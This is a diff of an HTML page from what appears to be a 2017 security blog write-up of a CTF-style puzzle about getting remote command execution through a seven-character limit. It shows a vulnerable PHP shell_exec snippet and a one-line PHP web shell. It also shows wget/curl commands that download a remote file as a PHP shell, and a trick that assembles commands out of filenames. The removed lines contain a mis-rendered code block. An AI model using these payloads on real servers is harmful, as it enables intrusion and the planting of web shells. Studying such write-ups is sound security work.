@@ -97,7 +97,7 @@
 <meta property="og:url" content="/2017/11/26/Escalating seven chars to get shell/index.html">
 <meta property="og:site_name" content="Ꭰ&#39;s security blog">
 <meta property="og:description" content="Dude, I heard something about 7 chars to get shell. It’s amazing! Let’s enjoy this.">
-<meta property="og:updated_time" content="2017-11-27T15:48:59.057Z">
+<meta property="og:updated_time" content="2017-11-27T15:53:36.403Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Escalate seven chars rce to get shell">
 <meta name="twitter:description" content="Dude, I heard something about 7 chars to get shell. It’s amazing! Let’s enjoy this.">
@@ -394,7 +394,13 @@
 <p>In truth, the first time to solve them is difficult for me. So I found the write up and tried to make it. Let’s focus on the solution.</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(strlen($_GET[<span class="number">1</span>])&lt;<span class="number">8</span>) &#123;</div><div class="line">	shell_exec($_GET[<span class="number">1</span>])</div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <p>Oh my god! What I can do is only 7 chars. I can just execute some simple command, for example: <code>ls /</code>, <code>pwd</code>, <code>whoami</code>,<code>sh file</code> . </p>
-<p>If you try to search <code>the shortest php code to get shell</code> in google, you will find the shortest  <figure class="highlight plain"><figcaption><span>whose length is more then 7. How about these one?</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">1. `1=echo 1&gt;1` 8 chars</div><div class="line">2. `1=wget a.cn` 9 chars</div><div class="line"></div><div class="line">With `&gt;1` in shell, the new file named 1 will be created. If I can write all the filenames into a shell, the problem will not exist. </div><div class="line"></div><div class="line">```shell</div><div class="line">wget a.cn -O 1.php</div><div class="line">curl a.cn -o 1.php</div></pre></td></tr></table></figure></p>
+<p>If you try to search <code>the shortest php code to get shell</code> in google, you will find the shortest  <strong>&lt;?=`$_GET[1]`?&gt;</strong> whose length is more then 7. How about these one?</p>
+<ol>
+<li><code>1=echo 1&gt;1</code> 8 chars</li>
+<li><code>1=wget a.cn</code> 9 chars</li>
+</ol>
+<p>With <code>&gt;1</code> in shell, the new file named 1 will be created. If I can write all the filenames into a shell, the problem will not exist. </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">wget a.cn -O 1.php</div><div class="line">curl a.cn -o 1.php</div></pre></td></tr></table></figure>
 <p><code>a.cn</code> and <code>1.php</code> are demo for explanation. I can use <code>&gt;</code> followed by name to create files. </p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="number">1.</span>php</div><div class="line">&gt;-O\ \\</div><div class="line">&gt;cn\ \\</div><div class="line">&gt;\ a.\\</div><div class="line">&gt;wget\\</div></pre></td></tr></table></figure>
 <p>The reason that we created these file in a reverse order is I can only use seven chars. Command <code>ls &gt;1</code> output the filenames by default order instead of created time.  Therefore I need this one <code>ls -t&gt;1</code>. Output is the following.</p>
